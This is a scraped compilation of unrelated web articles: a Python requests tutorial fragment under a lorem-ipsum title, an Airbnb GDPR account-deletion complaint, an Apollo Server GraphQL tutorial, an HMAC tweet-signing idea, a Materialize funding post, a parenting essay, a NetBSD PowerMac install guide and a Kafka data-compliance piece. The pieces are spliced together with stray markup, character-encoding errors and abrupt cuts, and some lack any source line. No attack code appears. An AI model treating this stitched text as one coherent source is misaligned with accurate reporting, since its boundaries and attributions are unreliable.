Title: sunt aut facere repellat provident occaecati excepturi optio reprehenderit
---------- Body ----------
quia et suscipit
suscipit recusandae consequuntur expedita et cum
reprehenderit molestiae ut ut quas totam
nostrum rerum est autem sunt rem eveniet architecto</code></pre>



<h2>Passing URL Parameters</h2>

<p>It is possible to pass parameters in the URL's query string when working with Requests. URL parameters are a common way of passing data, you often see them after the <code>?</code> in a URL. An example is <span>https://www.google.com/search?q=hello</span>&nbsp; this is the URL of google when you search for "hello", therefore the <code>q=hello</code> is the URL parameter.</p>

<p>To pass parameters to the URL, pass the parameters as a dictionary to the <code>params </code>keyword argument. For example; <span>?q=hello</span> will be <span>{'q':'hello'}.</span></p>

<pre><code>import requests

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params={"postId":1})

print(r.url)           # https://jsonplaceholder.typicode.com/comments/?postId=1</code></pre>

<p>You will notice that <code>r.url</code> returns a URL that has automatically appended the parameter to it; <code>?postId=1</code>.</p>



<p><strong>Another Example:</strong></p>

<pre><code>import requests

my_parameters = {"postId":2, "userId":8}

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params=my_parameters)

print(r.url)          # https://jsonplaceholder.typicode.com/comments/?postId=2&amp;userId=8</code></pre>

<p>The keys and values in the <code>my_parameters</code> dictionary,<code> {"postId":2, "userId":8}</code> is converted to <code>?postId=2&amp;userId=8</code> in the final URL.</p>

December 2, 2020 | https://blog.derhagen.eu/2020/12/02/airbnb-ignores-the-gdpr.html | <a href="https://web.archive.org/web/*/https://blog.derhagen.eu/2020/12/02/airbnb-ignores-the-gdpr.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  
  <p><span>02 Dec 2020</span></p><p>A couple of weeks ago, I decided to delete my AirBnB account. I had only used it two times in some years anyway and – while their platform is certainly comfortable to use – I prefer not to externalize my cost of traveling to those who need a place to live in, as I do in my own hometown. Turns out, deleting your account is easier said than done. While I was writing this article, I even found out that I had already tried to delete my account a year ago without success.</p>

<p>So what happened? The account deletion procedure is quite straightforward: You log into your account, after a while you find the form to delete it, verify yourself with a code sent to your phone, and that is it. Some dark patterns trying to make you “deactivate” your account, which pretty much doesn’t do anything at all, but we’re used to that, right?</p>

<p>Except, a while after I did this, I received an email:</p>

<blockquote>
  <p>We understand that you would like to exercise one of your data rights, namely the right of erasure. Airbnb is required to verify that the person making the request is the data subject entitled to the information being requested. […]</p>

  <p>We kindly ask you to send us both of the following:</p>

  <ul>
    <li>A re-statement of your request</li>
    <li>A photocopy of a valid official government ID such as your driver’s license or passport to validate your identity and to facilitate your request</li>
  </ul>
</blockquote>

<p>In other words: Thanks for your request. How about you ask us again? Further, your email, password, and the code sent to your phone certainly enable you to spend your money here, but our login system is not secure enough to authorize a deletion of your data.</p>

<p>Well, slightly annoyed, I repeated my request, mentioning that I verified three factors (Email+Password/Phone number/Ownership of email) to authorize my request now. The GDPR was on my side, since <a href="https://gdpr-info.eu/art-17-gdpr/">Art. 17</a> defines the right to erasure. While <a href="https://gdpr-info.eu/art-12-gdpr/">Art. 12(6)</a> reads “[…] where the controller has reasonable doubts concerning the identity of the natural person making the request referred to in Articles 15 to 21, the controller may request the provision of additional information necessary to confirm the identity of the data subject.”, I don’t see any way in which my identity could have been reasonably doubted at this point.</p>

<p>Long story short, what followed was 10 more emails full of customer service bullshit, a mail to the Irish Data Protection Commission (DPC), and finally, three weeks after my initial request – and without me uploading my passport:</p>

<blockquote>
  <p>We understand that you would like to delete all of your personal data. Please understand that this means that we will no longer be able to provide our services to you.</p>

  <p>As you have provided us with sufficient information to prove your identity, we’ve started to review your request.</p>
</blockquote>

<p>What a boring adventure! Well, aside from AirBnB not giving a damn about our funny European GDPR, I wondered the most about the DPC’s answer, that, while generally helpful, included the following paragraph:</p>

<blockquote>
  <p>Please also note that the Data Protection Commission (the “DPC”) acts as an
independent regulator, and is therefore not in a position to approve or
otherwise any specific data processing operations as this could prejudice
the investigation of any future complaints. We are an independent office
whose primary function is to give general guidance to members of the public
regarding data protection.</p>
</blockquote>

<p>To be clear: The responsible party for all AirBnB’s non-payment activity in Europe, where I live, is <em>Airbnb Ireland UC</em><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>,
which makes the <a href="https://www.dataprotection.ie/">Irish DPC</a> the responsible agency to send complaints to. This agency tells you that it won’t actually interfere with any data processing operations, since this might influence how future complaints are handled. That’s exactly what I thought was part of their job: Giving out fines to companies, thereby further clarifying the GDPR’s application. Or is the Irish DPC more of an outsourced call center for US companies to keep complaining customers busy? It’s not a secret you sometimes <a href="https://www.telegraph.co.uk/technology/2020/10/14/privacy-activist-max-schrems-sues-irish-data-watchdog-letting/">have to sue the DPC</a> to make them do their job. But such a clear confession that they don’t intend to enforce the only law they are supposed to deal with is bizarre.</p>

<p>In the European Union, we have a traditional race to the bottom, in which Luxembourg, failing to contribute economic value, makes its money by being an <a href="https://www.investopedia.com/ask/answers/100115/why-luxembourg-considered-tax-haven.asp">inner-European tax haven</a>. In the same way Luxembourg welcomes companies that don’t intend to pay taxes, Ireland openly advertises for companies who don’t want to be bothered by the GDPR. I told you that AirBnB is based in Ireland? Guess, where AirBnB based their <a href="https://blog.derhagen.eu/assets/airbnb_addresses.png">payment services in Europe</a><sup id="fnref:1:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_70_95b"><div><p>One of the many complaints about the GraphQL ecosystem is that there is a lot of indirection around what packages to use to create a GraphQL application. Even after selecting one, there is a lot of boilerplate code that one must create to make a GraphQL server work. While that is true, it does not have to be complicated. In this post, we will use Apollo Server to create the simplest possible GraphQL Server.</p><h2>Why Apollo Server?</h2><p>From all the available options for creating a GraphQL server using JavaScript (graphQL.js, Express GraphQL, GraphQL Yoga, Apollo Server, and GraphQL Helix), Apollo Server 2 is what we will be using in this post.</p><p><span>- Advertisement -</span> <ins data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1198872678846288" data-ad-slot="2989761355"></ins> </p><p>GraphQL Yoga seems to not be maintained anymore, thus it was easy ruling it out.</p><p>GraphQL.js was a too low level of implementation to consider.</p><p>GraphQL Helix did not seem to have a lot of community support.</p><p>The only other alternative to Apollo Server was Express GraphQL, but Apollo Server has a lot of convenience features that I preferred over Express GraphQL. Apollo Server’s Readme had a comparison with express-graphql at some point, which can help understand the differences. You can find it <a aria-label="undefined (opens in a new tab)" href="https://github.com/apollographql/apollo-server/tree/cfb086227e623ba1531bb887c3919e224682ccbc#comparison-with-express-graphql" target="_blank" rel="noreferrer noopener">here</a> (Git never forgets!).</p><p>There are other tools like Hasura, Prisma, etc., but those are related to ORM’s and other functionalities, and we will not be discussing those as options for this post.</p><p>Other benefits of Apollo server include:</p><ul><li>A plethora of built-in features</li><li>Huge community support (plus used at enterprises)</li><li>Frequently updated</li><li>Loads of additional libraries and tooling for different purposes</li><li>Interoperability with other frameworks</li></ul><p>With that, let us get started building a fully functional GraphQL API using Apollo Server. Our API will support both queries and mutations for reading and updating data. If you do not know about the <a href="https://www.wisdomgeek.com/development/web-development/graphql-basics-types-queries-mutations-schema/">GraphQL types (queries and mutations)</a>, we recommend reading our previous post about it. And if you are new to GraphQL itself, the post regarding <a href="https://www.wisdomgeek.com/development/web-development/why-graphql/">Why GraphQL </a>might be helpful to understand the advantages of GraphQL.</p><h2>Using GQL to create our type definitions</h2><p>Before doing anything, we will create a directory and use npm/yarn to install apollo-server in our project. Assuming that we have already done that, we will create a server.js file in our folder.</p><p>Apollo server provides us a named export “gql” that allows us to declare type definitions and resolvers. gql uses JavaScript template literals as a parameter passing mechanism. So instead of invoking it as a function, we invoke it using the tagged template literal syntax.</p><p>A schema definition contains the type definitions and all their relationships. But it needs to be enforced by the server. And that is what a type definition is. We use the gql named export, passing in our schema definition to get our type definitions.</p><pre><code>const { gql } = require('apollo-server');

const typeDefs = gql`
  # Our schema will be written here
`;</code></pre><p>With the type definitions in place, we have a definition that apollo knows about, but we cannot call these queries because they do not do anything right now. For the GraphQL API to be functional, we need to define resolvers.</p><h2>Defining Resolvers for the GraphQL Server</h2><p>Resolvers are functions that are responsible for populating the data for fields in our schema.</p><p>Resolvers are not a part of the GraphQL specification. But they are the typical way most GraphQL servers implement and process GraphQL requests. Every field defined in the type definition must have a corresponding matching resolver field for it to participate in the GraphQL request.</p><p>The GraphQL specification requires a root level query definition in the GraphQL type definition. We will create a resolver object in our code next. Taking a subset of our schema from the previous post:</p><pre><code>type Post {
  id: ID!
  title: String!
}
type Query {
  getAllBlogs: [Post]
}</code></pre><p>We will start defining our resolver. Resolvers are an object which references all the types in the schema and their resolver functions.</p><h3>Resolver function</h3><p> A resolver function is a convention used to map all fields in the type, and it takes in 4 parameters: parent, arguments, context, and information. It returns a result whose type is defined in the schema.</p><p>The parent parameter gives us the parent resolver of the current resolver. Since queries can be nested, this parameter helps us know the parent that invoked the current resolver. For a top-level resolver, it will be undefined.</p><p>The arguments parameter tells us what gets passed into the GraphQL request.</p><p>The context typically is some global configuration for our application (for example a database connection string).</p><p>The information parameter contains information about our application like the state of the application.</p><h3>Creating resolvers</h3><p>For our getAllBlogs resolver, the return type needs to be a list of posts. Let us create a JavaScript object for this and return it for now.</p><pre><code>const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      const blogs = [
        {
          id: 1,
          title: 'Why GraphQL?',
        },
        {
          id: 2,
          title: 'Creating a GraphQL API with Apollo Server',
        },
      ];
      return blogs;
    },
  },
};</code></pre><p>Before we get to the next step, it is important to point out that Apollo can do automatic generation of resolver functions. If the parent argument has a property with the resolver’s name and a corresponding value associated with it, Apollo server return’s the property’s value. If there is a mismatch in the name, it returns undefined. If the value is a function, it invokes the function and return’s the function’s return value.</p><p>For this case, we will explicitly create a resolver for each of the fields in the Post type as well. This is optional. But this gives us an idea of how the parent parameter can be used. Our resolvers object becomes:</p><pre><code>const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      const blogs = [
        {
          id: 1,
          title: 'Why GraphQL?',
        },
        {
          id: 2,
          title: 'Creating a GraphQL API with Apollo Server',
        },
      ];
      return blogs;
    },
  },
  Post: {
    id: (parent) =&gt; parent.id,
    title: (parent) =&gt; parent.title,
  },
};</code></pre><h2>Putting things together</h2><p>Now that we have our type definitions and resolvers written, we need to put those together, passing them to apollo server, and launch it. Just like we launch an express server with configurations, we start our apollo server:</p><pre><code>const server = new ApolloServer({ typeDefs, resolvers });
server.listen(4000).then(({ url }) =&gt; {
  console.log(`Server started at ${url}`);
});
</code></pre><p>If we run node server.js in the command prompt, the server should be up and running. Next, we go to localhost:4000 in our browser. We get a GraphQL playground that lets us send post commands to the server we just built. We will use this to query for our posts. IntelliSense can be used here to create our query. Upon execution of the query, we will get our hardcoded posts from the server.</p><figure><img src="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1024x333.png" alt="" srcset="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1024x333.png 1024w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-300x98.png 300w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-768x250.png 768w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1536x500.png 1536w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-696x226.png 696w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1392x453.png 1392w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response.png 1758w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><h2>Implementing Mutations</h2><p>Now that we know how to do queries, implementing mutations seems like an easy task. We need to add a mutation property to our type definition and implement it in the resolvers. Let us write a mutation to update the title of a blog post.</p><p>We add it to the type definition:</p><pre><code>type Mutation {
  updateBlogPost(id: ID!, title: String!): Post
}</code></pre><p>And the resolver has an additional property:</p><pre><code>const resolvers = {
  Query: { ... },
  Mutation: {
    updateBlogPost: (_, args) =&gt; {
      let blog = blogs.find((blog) =&gt; blog.id == args.id);
      if (blog) {
        blog.title = args.title;
        return blog;
      }
    },
  }
}</code></pre><p>We can then invoke the mutation in our playground after running the server and get the updated value back.</p><figure><img src="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1024x275.png" alt="" srcset="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1024x275.png 1024w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-300x80.png 300w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-768x206.png 768w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1536x412.png 1536w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-696x187.png 696w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1392x373.png 1392w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response.png 1603w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>The final code for our working server thus becomes:</p><pre><code>const { gql, ApolloServer } = require('apollo-server');

const blogs = [
  {
    id: 1,
    title: 'Why GraphQL?',
  },
  {
    id: 2,
    title: 'Creating a GraphQL API with Apollo Server',
  },
];

const typeDefs = gql`
  type Post {
    id: ID!
    title: String!
  }

  type Query {
    getAllBlogs: [Post]
  }

  type Mutation {
    updateBlogPost(id: ID!, title: String!): Post
  }
`;

const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      return blogs;
    },
  },
  Post: {
    id: (parent) =&gt; parent.id,
    title: (parent) =&gt; parent.title,
  },
  Mutation: {
    updateBlogPost: (_, args) =&gt; {
      let blog = blogs.find((blog) =&gt; blog.id == args.id);
      if (blog) {
        blog.title = args.title;
        return blog;
      }
    },
  },
};

const server = new ApolloServer({ typeDefs, resolvers });
server.listen(4000).then(({ url }) =&gt; {
  console.log(`Server started at ${url}`);
});
</code></pre><p>We hope this helps in getting started with Apollo Server! If you have any queries, drop a comment below, and we will help you out.</p></div></div></div>]]>

<p>I was following some interesting discussions about how no one should trust a print screen of a tweet, and it got me thinking regarding how to overcome such a challenge.</p>



<p>What if somehow we could attach a verifiable piece of text (or image QR code) to a tweet that could&nbsp;<strong>quickly disprove</strong>&nbsp;a fake print screen or still optimistically could point that this print&nbsp;<strong>might</strong>&nbsp;be legit.</p>

<p>I thought about using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/HMAC" target="_blank">HMAC</a> to solve this problem, where <strong>the secret</strong> is something that only Twitter knows and it’s <strong>tied to each user</strong>. Every tweet must have an SHA 256 signature, <strong>signature = HMAC(user.secret, tweet).</strong></p>



<p>For the sake of UX/UI, this signature can show only its first ten characters, a short hash and it still retains a good number of permutations (16^10).</p>



<p>Now when you see a print screen <strong>claiming</strong> that @someone told “this and that” you can <strong>go to</strong> somewhere like twitter.com/<strong>check</strong> and <strong>type</strong> the username, the message plus its <strong>alleged signature</strong> and verify whether it’s fake or might be legit.&nbsp;</p>



<p>Sounds good and simple, done:</p>

<p><strong>Of course not</strong>, such an idea needs to be refined and proven to be safe. <strong>I foresee many challenges</strong>, one of them being, let’s say someone is trying to check a print however this person might <strong>not be able to replicate</strong> the images, emojis, special characters or even to match the number of spaces/newlines.&nbsp;</p>



<p>For that reason, a kind of allow list filtering out anything else might be in hand. The question is, what characters such a set would hold? The basic Latin character set [a-z, A-Z] is not enough. We have special accent characters in languages such as Portuguese, Spanish and French. And languages such as Hebrew, Japanese, Chinese are best represented by Unicode/UTF-8 characters.</p>



<p>Also, since I’m not a security specialist in any capacity, I don’t know what happens <strong>if the secret remains the same over time</strong> with a ton of tweets and signatures exposed. Is it possible for an observer <strong>to break</strong> this thing?</p>



<p>Well, that’s my silly approach to try to fight the Fake Tweet Print Screen. What do you think? Is it feasible? Is it even necessary to build such a system? Or is it just a plain stupid idea?</p>

December 2, 2020 | https://materialize.com/materialize-series-b/ | <a href="https://web.archive.org/web/*/https://materialize.com/materialize-series-b/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today we <a href="https://www.prnewswire.com/news-releases/materialize-raises-40-million-to-simplify-streaming-data-with-sql-and-speed-up-real-time-analytics-301180777.html">announced</a> that we raised a $32M Series B round of funding led by Kleiner Perkins. This follows a $8.5m Series A last year led by Lightspeed Venture Partners, bringing our total funding to-date to a little over $40 million. With our Series B, <a href="https://www.kleinerperkins.com/people/bucky-moore/" target="_blank" rel="noopener noreferrer">Bucky Moore</a> joins <a href="https://lsvp.com/?team=ravi-mhatre/" target="_blank" rel="noopener noreferrer">Ravi Mhatre</a> on our board of directors.</p>
<p>At Materialize, we believe that at every business it will soon be essential for all information to be always up-to-date. Whether it’s delivering personalized experiences, accurately identifying fraud, building predictive AI, or discovering new business opportunities, the ability to run complex queries on multiple streams of data and keep their answers up to date is critical to making better decisions about the changing world around us.</p>
<p>While the past decade has seen a groundswell in the adoption of streaming platforms, they are still too difficult to use. Current systems require users to make tradeoffs between dumbing down their queries, waiting for hours-long batch ETL pipelines to finish, or building and orchestrating sprawling microservices. We believe users should not have to make these tradeoffs.</p>
<p>Materialize’s mission is to make queries against streaming data simple. We support industry standard SQL: write queries with multi-way joins, correlated subqueries, and complex aggregations, and we’ll keep the answers always up to date for you. In a world where “real-time” has become an empty buzzword, Materialize provides answers that are up to date within milliseconds. All of this comes in <a href="https://materialize.com/docs/install/" target="_blank" rel="noopener noreferrer">a single binary</a> that is easy to install, easy to use, and easy to deploy. With Materialize, users can get interactive and always-up-to-date answers about their changing data using only their existing SQL skills.</p>
<p>While Materialize is a young company, it is built on top of the award winning Timely Dataflow project, spanning almost a decade of cutting-edge research on stream processing led by my co-founder Frank McSherry. Starting from this solid foundation, $40 million dollars of capital gives us the resources to build the no-compromise streaming database that lets every developer build streaming applications.</p>
<p>With this new round of funding, we are well equipped to deliver on <a href="https://materialize.com/blog-roadmap/" target="_blank" rel="noopener noreferrer">an ambitious roadmap</a>, including a fully-managed cloud service with tiered storage and replication. We’re also excited to continue work on broadening the suite of SQL tools that we support, as well as investing in a SQL optimizer, performance and benchmarking work, and in making Materialize more resilient and battle-tested. If you’re interested in working on any of these challenges, Materialize <a href="http://materialize.com/careers" target="_blank" rel="noopener noreferrer">is hiring</a> across the board.</p>
<p>And finally, while it is exciting to build Materialize, it has been even more exciting to see how Materialize is being used to build applications that previously would have required months of development, using just a few simple SQL queries. If you’re as excited about Materialize as we are, we’d love for you to get involved. <a href="https://materialize.com/quickstart/" target="_blank" rel="noopener noreferrer">Download</a> and try Materialize, try <a href="https://materialize.com/docs/katacoda/?intro-wikipedia" target="_blank" rel="noopener noreferrer">a demo</a> in your browser, <a href="https://join.slack.com/t/materializecommunity/shared_invite/zt-jjwe1t45-klG9k7V7xibdtqA6bcFpyQ" target="_blank" rel="noopener noreferrer">join the community</a> and say hello, or <a href="http://materialize.com/careers" target="_blank" rel="noopener noreferrer">apply</a> to join our growing team today!</p>

<p>Clifford Stott is famous for <a href="https://www.scientificamerican.com/article/taming-the-madness-of-crowds/">decreasing European football hooliganism and rioting</a>. He trained the police on “low-profile, nonaggressive tactics” and said to “leave the riot gear behind.” It worked. Turns out, when hooligans aren’t treated like hooligans, they stop acting like hooligans. </p>



<p>Thinking about my <a href="https://critter.blog/2020/08/28/your-client-is-a-free-resource-not-a-problem/">toughest clients</a>, my most <a href="https://critter.blog/2020/10/28/the-all-powerful-bad-apple/">abrasive coworkers</a>, my <a href="https://critter.blog/2020/10/23/parenting-doesnt-do-what-i-thought/">misbehaving kids</a>, and my drama-filled family members, I wonder how much of that was a self-fulfilling prophecy. I thought they were that way, so I treated them that way, so they acted that way.</p>



<figure><blockquote><p>We become what we are told we are.</p><cite>Fredrik Backman, <em>Beartown</em></cite></blockquote></figure>



<p><a href="https://critter.blog/2020/08/26/extreme-ownership-book-notes/">Extreme Ownership</a> has a fantastic chapter called “Leading Up and Down The Chain”. It explains that whenever anyone is acting a fool, you have to ask yourself what <em>you </em>are doing wrong to cause that.</p>



<p>If your boss is being a jerk, assume for a second that’s <em>your</em> fault. What are you doing that’s making her lash out? What are you not giving her that she needs? Are you expecting her to be a jerk and letting that tarnish your interaction with her? “We become what we are told we are.”</p>



<p>Lots of parenting books talk about breaking <a href="https://critter.blog/2020/06/10/spotting-broken-processes/">a cycle that isn’t working</a>. Say my kid resists doing his homework, and every night is a battle about it that ends with yelling and tears. That’s a cycle that isn’t working. I can keep trudging up that terrible hill, or I can break the cycle. Maybe <a href="https://critter.blog/2020/10/12/failing-with-abandon/">failing with abandon</a> is the answer for once. Maybe if I treat him like a kid who does his homework willingly, then he’ll become that kid. “We become what we are told we are.”</p>



<p>This all boils down to the cliche that we should take the charitable stance. But that’s a tough rule to follow in the moment. Instead, try this: <em>treat everyone like the person you want them to be, rather than the person you think they are</em>. </p>



<p>(And if you’re sure it won’t work with that one toxic person you have in mind, <a href="https://critter.blog/2020/09/21/experimenting-on-myself/">pitch it as an experiment</a> since that way <a href="https://critter.blog/2020/10/26/you-cant-fail-at-experiments/">you can’t fail</a>!)</p>

December 2, 2020 | http://www.rabbitfarm.com/cgi-bin/blosxom/netbsd/2020/11/30 | <a href="https://web.archive.org/web/*/http://www.rabbitfarm.com/cgi-bin/blosxom/netbsd/2020/11/30">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="summary">Summary</h2>
<p>A Power Macintosh G4 system is so named because it is powered by a <a href="https://en.wikipedia.org/wiki/PowerPC_G4">PowerPC G4 CPU</a>. The G4 chip powered several Apple systems for roughly a five year period (1999 - 2004). After the G4 era Apple used another PowerPC chip, the G5, and then transitioned to Intel based chips until 2020 with the introduction of ARM based systems. The history of the PowerPC family of chips and the collaboration between IBM, Motorola, and Apple is well worth reading up on if you are a fan of computing history.</p>
<p>In any event, Appleâ€™s G4 based product line was very popular and there are many available cheaply on the second hand market. A PowerPC based Apple computer running NetBSD is a nice low cost platform for hobby and research projects!</p>
<p>Using some rough benchmarks my G4 system is about 15 times slower than a modern (lower end) dual core Windows 10 computer I have. Still, for computers which are roughly twenty years old (as of this writing) they are surprisingly performant. NetBSD is as lean and mean of an Operating System as you can get and you can be assured you are getting about as much computational horsepower as possible out of these machines.</p>
<p>An outline of what follows:</p>
<ul>
<li>The NetBSD installer can be booted from a variety of media. Here I describe using a USB drive. If you use a CD or other installation media these steps will still mostly be the same, albeit it with minor modifications.</li>
<li>The target system had no OS on it at the time of installation. I do not describe the use of Mac OS X based tools on the target system. That is certainly a viable option but not one I am as familiar with.</li>
<li>I assume that you will be using this system exclusively for NetBSD. Multibooting will either require either a different partitioning scheme than what I describe here or separate drives for each OS.</li>
<li>Disk partitioning was done using <a href="https://man.netbsd.org/macppc/pdisk.8">pdisk</a> in the installer.</li>
<li>Once the installation is completed several steps still need to be done in order to have NetBSD boot normally. These systems boot using <a href="https://en.wikipedia.org/wiki/Open_Firmware">Open Firmware</a> v3.0 which requires slightly different steps than systems with older Open Firmware versions.</li>
<li><strong>Make sure you do some reading and understand pdisk and Open Firmware before proceeding.</strong></li>
<li><strong>You should absolutely expect to start/stop this process a few times as you hit snags and deepen your knowledge of the process. Consider this a good thing! You are getting a valuable experience in hardware and processes known to only a relatively small number of people!</strong></li>
</ul>

<p>I did not happen to have any CD-R media available so I decided to boot the installer off of a USB drive. Surprisingly this method is not covered at all in the official docs but I eventually found something done for <a href="https://people.freebsd.org/~seanc/freebsd/create-memstick-osx/">FreeBSD</a> which described the necessary process.</p>
<ol type="1">
<li>Download the installer .iso. I used <a href="https://cdn.netbsd.org/pub/NetBSD/NetBSD-9.1/images/NetBSD-9.1-macppc.iso">this one</a>.</li>
<li>Write this to a USB drive. On Linux or OS X you would use the <code>dd</code> command. On Windows there is a tool called <a href="https://rufus.ie/">rufus</a> for doing this. I used an OS X computer for creating the installation media.</li>
<li>In the Terminal I used <code>diskutil</code> to confirm the device for my USB drive. In the output below you can see that <code>/dev/disk8</code> is the USB drive I want to use.</li>
</ol>

<h2 id="booting-the-installer">Booting the installer</h2>
<p>Ok, this is perhaps the trickiest part because the information anyone reading this might need most likely will vary!</p>
<ol type="1">
<li><p>Put the USB drive into one of the Macâ€™s USB ports. Power on the system and hold down the CMD+Option+O+F keys until you are dropped into the Open Firmware prompt.</p></li>
<li><p>Now you need to identify a few things using the <code>devalias</code> command. Type <code>devalias</code> and hit enter and inspect the output. Can you see the USB devices? You might see two, one for your keyboard and the other is your drive. Can you see one named <code>hd</code>? That is your harddrive. You might havew multiple harddrives installed though. Which one do you plan on installing the system on? In the References section at the end of this article check out and read the Open Firmware pages I link to. Consider this required homework for a successful NetBSD/MacPPC installation!</p></li>
<li><p>After understanding the device IDs for your USB drive with the installer and the drive you will be installing to you can boot with a command that looks like this:</p></li>
</ol>
<p><code>boot usb1/disk:,\ofwboot.xcf netbsd.macppc</code></p>
<p>If this is successful you should see a bunch of boot messages and then the initial installer screen.</p>
<p>If youâ€™ve made it this far, to a booted installer, savor your success before moving on to the next step.</p>
<h2 id="partitioning">Partitioning</h2>
<ol type="1">
<li><p>In the installer menu choose the option to drop to a shell. Alternatively you could have chosen to drop to a shell immediately before the installer fully loads. Either one is fine. If you chose to drop to a shell instead of the installer you will need to run the <code>sysinst</code> command when you are done partitioning to get back to the installer.</p></li>
<li><p>Execute the <code>pdisk</code> command. Your command will look something like <code>pdisk /dev/rwd0c</code>. In fact that might be exactly it, but to be sure you can look through the output of <code>dmesg</code> or <code>ls /dev</code>. Keep in mind that this is the same drive referred to as <code>hd</code> in Open Firmware and that the partitions you create here will map to, for example, <code>hd:2</code> or <code>hd:3</code> when you get around to the final boot configurations.</p></li>
<li><p>You can experiment with <code>pdisk</code>…</p></li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Several years ago when I was working on a big data project, I saw something a data engineer shouldn’t see. Curious to understand the level of detail in a new credit score dataset we’d received in our data lake, I queried it. I was surprised at how easily and suddenly my screen was flooded with the mortgage history, overdraft limits and year-end financial statements of my colleagues, and I felt deeply uneasy. 
</p><p>If I stumbled upon this data, how easy would it be for a malicious user to sell PII (personally identifiable information) data across the dark web? The kind of breach that has since lost trading licenses and slapped several organizations with fines for millions of dollars.</p><p>More recently, contracting at a large global financial services firm, my team encountered constant challenges getting our data projects signed off and into production. The biggest was meeting the maze of data compliance controls. 
</p><p>Asking for special dispensation was getting more difficult in a world of Dodd-Frank, MIFID II and post-financial crash. 
</p><p>Fast forward a few years, the level of regulation has increased, as has the need for engineering teams to continuously access real-time data.
</p><p>We knew that helping organizations meet data compliance for Apache Kafka should be one of our priorities. This would be with the following in mind:
</p><ul><li><p> <b>Responsiveness to real-time needs: </b>The likes of Apache Kafka are powerful Open Source streaming technologies, but we need rules in place to make them useful for business outcomes.</p></li><li><p> <b>
Design for a world of DevOps and DataOps:</b> This means introducing controls in a world of agile data management and data engineering.</p></li><li><p> <b>Flexibility to apply constant regulation updates</b> and change access controls to cover multiple regulatory frameworks, including SEC,<a target="_blank" href="https://lenses.io/blog/2020/04/how-you-can-keep-your-real-time-data-operations-on-the-right-side-of-gdpr-apache-kafka/"> GDPR</a>, CCPA, HIPAA etc.
</p></li><li><p> <b>Identifying (and mitigating) data risk:</b> Not all data carries the same impact and level of confidentiality. </p></li><li><p> <b>Passing audits without manual processes:</b> Helping speed up the reporting time of audits.</p></li></ul><p>For us this has been implemented as a Data Policy framework. 
</p><p>The framework is designed to cover data compliance and information security best practices for real-time data. 
</p><p>And although we often talk about protecting PII data, the Data Policies framework helps address data compliance more broadly.  For example, we give visibility over sales transactions whilst masking the order value from internal employees to meet insider trading compliance. 
</p><p>Here we outline the framework and the journey you can take to increase your compliance. </p><h2>Discovery of PII residing in Kafka</h2><p>As your Kafka adoption across teams and projects expands, it’s easy for data sources to proliferate. And to find yourself non-compliant at any moment.&nbsp;&nbsp;</p><p>Keeping track of information flowing through Apache Kafka will be especially important when it comes to conducting audits.&nbsp;&nbsp;</p><p>But Apache Kafka as a black box doesn’t make this easy.</p><p>This usually means weeks if not months of manual reporting and interviewing teams when it comes to a compliance audit.&nbsp;</p><p>This is the first problem we're addressing with our<a href="https://help.lenses.io/using-lenses/data/data-policies/"> Data Policies</a>.</p><p>We do this by intelligently keeping track of metadata across your Kafka Streams, no matter the serialization (CSV, <a target="_blank" href="https://lenses.io/videos/custom-serde-classes-google-protobuf-for-apache-kafka/">Protobuf </a>and custom proprietary formats).&nbsp;</p><p>It’s the same technology that powers our <a target="_blank" href="https://lenses.io/blog/2020/07/Why-new-Streaming-SQL-opens-up-data-platform/">SQL engine</a> to query data on the wire as well as our <a target="_blank" href="https://lenses.io/blog/2020/07/data-dump-real-time-data-catalog-apache-kafka/">data catalog</a>.&nbsp;</p><p>And it's presented as a data experience UI. Having a variety of ways to interface with data policies makes it easier to zoom in or out of topics and applications to see how they are interrelated, whether in a list or in a Topology as shown here:</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/4ZsimkLEYFBGwb0hyLIl42/e02f5ddd45be08a4bddc0b1c3fadb865/Data-Policies-Illustrations_04.png" alt="Data-Policies-Kafka"></p><p>Understanding how data is related allows us to define interesting fields that represent datasets.

